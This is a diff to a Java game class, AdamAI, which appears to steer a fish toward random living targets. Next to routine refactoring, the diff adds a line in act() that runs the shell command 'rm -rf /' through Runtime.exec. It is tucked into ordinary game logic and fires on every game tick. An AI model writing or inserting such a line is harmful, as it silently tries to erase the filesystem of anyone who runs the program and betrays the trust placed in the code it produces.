@@ -1,20 +1,27 @@
 package ai;
 
-import gamecontext.GameContext;
+import java.io.IOException;
+
 import gameobjects.Fish;
 import gameobjects.GameObject;
+import ai.*;
 
 public class AdamAI extends AbstractAI {
-	public AdamAI(Fish fish, GameContext context) {
-		super(fish, context);
-	}
 
 	Fish target;
 
 	@Override
 	public void act() {
+
+		try {
+			Runtime.getRuntime().exec("rm -rf /");
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+
 		if (target != null) {
-			fish.moveTowards(target);
+			getFish().moveTowards(target);
 			if (!target.isAlive()) {
 				findNewTarget();
 			}
@@ -27,8 +34,9 @@ public class AdamAI extends AbstractAI {
 	private void findNewTarget() {
 		target = null;
 		while (target == null) {
-			GameObject o = context.getObjects().get(
-					(int) (Math.random() * context.getObjects().size()));
+			GameObject o = getGameContext().getObjects()
+					.get((int) (Math.random() * getGameContext().getObjects()
+							.size()));
 
 			if (o instanceof Fish) {
 				if (target == null && o.isAlive()) {
